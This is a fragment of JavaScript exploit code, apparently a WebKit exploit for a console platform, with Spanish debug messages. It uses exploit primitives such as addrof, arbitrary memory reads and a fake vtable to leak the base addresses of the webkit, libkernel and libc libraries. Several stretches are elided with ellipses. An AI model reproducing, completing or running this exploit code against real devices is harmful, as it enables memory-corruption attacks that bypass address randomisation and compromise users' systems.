...
function get_got_addr(idx)
{
    ...
    var q = read_mem(p, 6);
msg.value+='\nEn get_got_addr('+idx+')-> Valor de p='+p+' q='+q;
...
msg.value+='\nDirecciòn de tarea '+addrof(tarea);
msg.value+='\nValor de real_vt_ptr '+real_vt_ptr;
msg.value+='\nValor de fake_vt_ptr '+fake_vt_ptr;
msg.value+='\nValor de real_vtable '+real_vtable;
msg.value+='\nValor de fake_vtable '+fake_vtable;
msg.value+='\nValor de fake_vt_ptr_bak '+fake_vt_ptr_bak;
msg.value+='\nValor de plt_ptr '+plt_ptr;

var webkit_base = read_ptr_at(fake_vtable);
msg.value+='\nValor de webkit_base '+webkit_base;
var libkernel_base = get_got_addr(705)-0x10000;
msg.value+='\nValor de libkernel_base '+libkernel_base;
var libc_base = get_got_addr(582);
msg.value+='\nValor de libc_base '+libc_base;
